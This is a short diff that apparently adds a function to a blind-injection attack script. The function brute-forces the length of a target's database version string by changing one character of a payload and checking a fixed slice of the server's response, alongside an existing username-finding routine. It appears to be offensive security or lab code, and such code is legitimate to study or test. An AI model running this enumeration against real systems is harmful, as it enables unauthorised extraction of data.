@@ -141,3 +141,23 @@ def find_username(payload, validator):
     return username
 
     
+def find_version_length(payload, validator):
+    response = False
+    i = 1
+    while (response == False):
+        list_payload = list(payload)
+        list_payload[86] = str(i)
+        payload = "".join(list_payload)
+
+        print(payload)
+        response_text = get_requester(payload)
+        response_formatted_text = text_formatter(response_text)
+
+        if (validator == response_formatted_text[505:513]):
+            response = True
+            version_length = i
+        else:
+            response = False
+            i = i + 1;
+
+    return version_length
